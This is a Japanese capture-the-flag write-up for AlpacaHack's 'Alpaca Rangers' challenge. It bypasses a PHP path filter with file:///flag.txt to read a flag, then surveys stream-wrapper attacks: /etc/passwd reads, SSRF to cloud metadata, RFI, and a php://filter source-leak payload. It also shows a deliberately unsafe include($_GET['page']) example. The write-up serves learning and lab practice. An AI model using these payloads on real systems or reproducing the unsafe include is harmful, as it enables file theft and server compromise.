# 2026/02/25 問題

https://alpacahack.com/daily/challenges/alpaca-rangers

## 問題文

```
Hero of Justice, Alpaca Rangers!

http://34.170.146.252:51136
```

## 考察

Dockerfile を確認。FLAG はルートディレクトリに、Web ページは `/var/www/html/` に配置されている。

```
FROM php:8.5-apache

COPY flag.txt /flag.txt
COPY index.php /var/www/html/index.php
COPY *.png /var/www/html/
```

`index.php` を確認。クエリパラメータ `?img=` に指定されたファイルを読み込んで表示しているので、方向性としては、ここを攻めていくものと思われる。

```
<?php

$publicDir = realpath(__DIR__) ?: __DIR__;
$targetPath = $_GET['img'] ?? '';
$errorMessage = '';
$dataUri = '';

if ($targetPath !== '') {
    if (str_starts_with($targetPath, '/') || str_starts_with($targetPath, '\\') || str_contains($targetPath, '..')) {
        $errorMessage = 'Invalid path.';
    } else {
        $contents = @file_get_contents($targetPath);
        if ($contents === false) {
            $errorMessage = 'Not found.';
        } else {
            $finfo = new finfo(FILEINFO_MIME_TYPE);
            $mimeType = $finfo->buffer($contents) ?: 'application/octet-stream';

            $dataUri = 'data:' . $mimeType . ';base64,' . base64_encode($contents);
        }

    }
}

~~~ snip ~~~


    <?php if ($dataUri !== ''): ?>
        <figure>
            <img src="<?= $dataUri ?>" alt="<?= htmlspecialchars($targetPath, ENT_QUOTES | ENT_HTML5) ?>" />
            <figcaption><?= htmlspecialchars($targetPath, ENT_QUOTES | ENT_HTML5) ?></figcaption>
        </figure>
    <?php endif; ?>
</body>
</html>
```

flag.txt にアクセスするために絶対パスか相対パスでルートディレクトリにアクセスする必要があるが、できないようチェックされている。

```
if (str_starts_with($targetPath, '/') || str_starts_with($targetPath, '\\') || str_contains($targetPath, '..')) {
    $errorMessage = 'Invalid path.';
} else {
  $contents = @file_get_contents($targetPath);
```

しかし、絶対パスを禁じる機構は `str_starts_with()` で構成されており、先頭に `/` があるかどうかでしかチェックしていない。

また、 `file_get_contents()` はファイルパスだけでなく、スキーマも受け取れてしまうため、 `file://` をファイルパスの前に置くことでチェックをすり抜け、絶対パスで `/flag.txt` にアクセスすることができる。

表示された flag.txt の中身の確認方法だが、以下のように img タグで表示されているため、元の状態では壊れたファイルとして表示されるだけである。

```
<?php if ($dataUri !== ''): ?>
    <figure>
        <img src="<?= $dataUri ?>" alt="<?= htmlspecialchars($targetPath, ENT_QUOTES | ENT_HTML5) ?>" />
        <figcaption><?= htmlspecialchars($targetPath, ENT_QUOTES | ENT_HTML5) ?></figcaption>
    </figure>
<?php endif; ?>
```

しかし、 `$dataUri` は下記のように base64 エンコードされた `flag.txt` の中身が含まれているため、ブラウザの検証ツールを使用することで中身を確認することができる。

```
$contents = @file_get_contents($targetPath);
if ($contents === false) {
    $errorMessage = 'Not found.';
} else {
    $finfo = new finfo(FILEINFO_MIME_TYPE);
    $mimeType = $finfo->buffer($contents) ?: 'application/octet-stream';

    $dataUri = 'data:' . $mimeType . ';base64,' . base64_encode($contents);
}
```

## 回答

以下のクエリパラメータを指定することで `flag.txt` を呼び出す。

```
http://34.170.146.252:51136/?img=file:///flag.txt
```

この状態でブラウザの検証ツールを使用すると img タグの要素は以下のようになっている

```
<img src="data:text/plain;base64,QWxwYWNhe0FscGFjYV9ncmUzbl9hbmRfcDFua19jb20xbmdfczBvbn0=" alt="file:///flag.txt">
```

これをデコードするとフラグが得られる。( `=\` 以降はパディングのため無視 )

```
$ echo "QWxwYWNhe0FscGFjYV9ncmUzbl9hbmRfcDFua19jb20xbmdfczBvbn0" | base64 -d
Alpaca{Alpaca_gre3n_and_p1nk_com1ng_s0on}%
```

## 参考

### PHP ストリームラッパーについて

PHPの関数（`file_get_contents`、`include`、`fopen` など）は単なる物理ファイル ( `file://`) だけでなく、下記のような、あらゆるデータソースを取り扱うことができる。これを実現している機能がストリームラッパーである。

- 通信 (`http://`, `ftp://`, ..)
- 圧縮ファイル (`zip://`, `zlib://`, ..)
- メモリ (`data://`, `php://`, ..)

しかし、これらは様々なバグや脆弱性の温床となっている。

#### 1. フィルターの無効化（今回のケース）

今回のように、開発者が「絶対パス（ `/` から始まる文字列）を禁止すれば、システムファイルは読まれないだろう」と文字列の先頭だけをチェックする甘いフィルターを作ったとする。
しかし、 `file_get_contents` は `file://` というスキームを理解できるため、 `file:///etc/passwd` や `file:///flag.txt` のように、「最初の文字をアルファベットにしつつ、堂々と絶対パスを指定する」 ことが可能になってしまう。

#### 2. SSRF / RFI (外部への通信)

もしPHPの設定で `allow_url_fopen`が有効になっていると、 `file_get_contents('http://悪意のあるサイト/ウイルス.txt')` のように、外部のHTTPやFTPスキームまでそのまま読み込めてしまう。すると下記のような攻撃が可能になってしまう。

- SSRF (Server-Side Request Forgery): サーバーを踏み台にして、内部ネットワーク（AWSのメタデータ `http://169.254.169.254/` など）にアクセスさせる。

- RFI (Remote File Inclusion): 外部から悪意のあるPHPコードを読み込ませて、そのままサーバー上で実行（RCE）させる。

#### 3. ソースコードの強制出力（ `php://` スキームの悪用）

CTF の Web 問題においても頻出の手口。
LFI（Local File Inclusion）の脆弱性を利用してサーバー内の `.php` ファイル（ `config.php` や `flag.php` など）を読み込ませようとしても、通常はPHPエンジンがプログラムとして実行してしまうため、一番知りたい「生のソースコード」を画面に表示させることができない。
しかし、PHP独自のスキームである `php://` を使い、

```
php://filter/read=convert.base64-encode/resource=flag.php
```

のように指定することで、この自動実行の仕様を回避できる。

今回は `index.php` 内でファイルの中身を Base64 エンコードして表示しているため、上の手口を使う必要もないが、下記のように PHP プログラムとして解釈・実行されるような実装の場合は、上述の攻撃ペイロードを使用することで、ソースコードを表示させることができる。

```
<?php
$page = $_GET['page'];

include($page);
?>
```
